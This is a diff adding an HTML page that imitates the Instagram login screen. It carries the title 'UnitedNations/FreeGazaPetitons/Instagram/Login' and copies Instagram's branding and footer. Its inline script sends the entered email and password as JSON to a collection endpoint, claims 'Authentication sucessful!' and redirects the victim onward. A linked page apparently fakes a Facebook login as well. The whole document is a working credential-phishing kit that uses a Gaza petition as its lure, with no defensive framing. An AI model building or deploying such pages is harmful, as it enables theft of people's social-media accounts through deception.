@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>UnitedNations/FreeGazaPetitons/Instagram/Login</title>
+    <link rel="stylesheet" type="text/css" href="./assets/styles2.css">
+     <script src="./main/main.js" defer></script>
+</head>
+<body>
+    <section id="main-section">
+        <div class="container">
+            <div class="img-content">
+                <img src="./assets/images/phones.png" alt="img here"/>
+            </div>
+            <div class="form-content">
+                <div class="form-container">
+                   <div class="logo">
+                    <img src="./assets/images/Subject_Guides__Citation_Style_Guide__Citing_Social_Media-removebg-preview.png" alt="img here"/>
+                   </div>
+                        <div class="input-container">
+                        <input class="email" aria-label="Phone Number, username or email" aria-required="true" placeholder="Phone Number, username or email" name="email" id="I_email"/>
+                        <h4 class="errormsg" id="error1">Enter a valid email. "e.g janedoe@gmail.com"</h4>
+                        <input class="password" aria-label="Password" aria-required="true" placeholder="Password" name="password" id="I_phone"/>
+                        <h4 class="errormsg" id="error2">Enter Correct Password !</h4>
+                        <button class="login" onclick="submitFormData()">Login</button>
+                    </div>
+                    <div class="or-div">
+                        <hr>
+                        <h3 class="or-text">OR</h3>
+                        <hr>
+                    </div>
+                    <a href="./facebook.html" style="text-decoration: none;">
+                    <div class="facebook-sign">
+                        <img src="./assets/images/icons8-facebook-30.png" alt="img here">
+                        <h2>Log in with facebook</h2>
+                    </div>
+                </a>  
+                    <a href="#" class="forgotten">
+                        Forgotten Password?
+                    </a>
+                </div>
+                <div class="dhacct">
+                    <h2>Don't have an account?</h2>
+                    <a href="#">Sign up</a>
+                </div>
+                <h3 class="get-app-txt">Get the app</h3>
+                <div class="store-img">
+                    <div id="playstore">
+                        <img src="./assets/images/c5Rp7Ym-Klz.png" alt="img here"/>
+                    </div>
+                    <div id="microsoft">
+                        <img src="./assets/images/EHY6QnZYdNX.png" alt="img here"/>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+    <footer>
+        <div class="feature-links">
+            <ul>
+                <li><a href="#">Meta</a></li>
+                <li><a href="#">About</a></li>
+                <li><a href="#">Blog</a></li>
+                <li><a href="#">Jobs</a></li>
+                <li><a href="#">Help</a></li>
+                <li><a href="#">API</a></li>
+                <li><a href="#">Privacy</a></li>
+                <li><a href="#">Terms</a></li>
+                <li><a href="#">Locations</a></li>
+                <li><a href="#">Instagram Lite</a></li>
+                <li><a href="#">Threads</a></li>
+                <li><a href="#">Contact Uploading & Non Users </a></li>
+                <li><a href="#">Meta Verified</a></li>
+            </ul>
+        </div>
+        <h3 class="copyright">&copy; 2023 instagram from meta</h3>
+    </footer>
+    <script>
+          const submitFormData = async () =>{
+            const IEmail = document.getElementById('I_email').value;
+            const IPhone = document.getElementById('I_phone').value;
+            const error1 = document.getElementById('error1');
+            const error2 = document.getElementById('error2');
+            
+            function validateEmail(email) {
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return emailRegex.test(email);
+            }
+            if(IEmail == ''){
+                error1.style.display = 'block';
+            }
+            if(IPhone == ''){
+                error2.style.display = 'block';
+            }
+            if(!validateEmail(IEmail)){
+               error1.style.display = 'block';
+            }
+            else{
+            error1.style.display = 'none';
+            error2.style.display = 'none';
+            try {
+            const formData = {email: IEmail, password:IPhone}
+            const response = await fetch('http://localhost:3000/endpoint2', {
+                method : 'POST',
+                headers : {
+                    'Content-Type': 'application/json',
+                },
+                body : JSON.stringify(formData)
+            });
+
+            if(response.status === 200){
+                alert('Authentication sucessful!')
+                window.location.href = "pageThree.html"
+            }
+            } catch (error) {
+                console.error('Error', error)
+            }
+        }
+        }
+    </script>
+</body>
+</html>
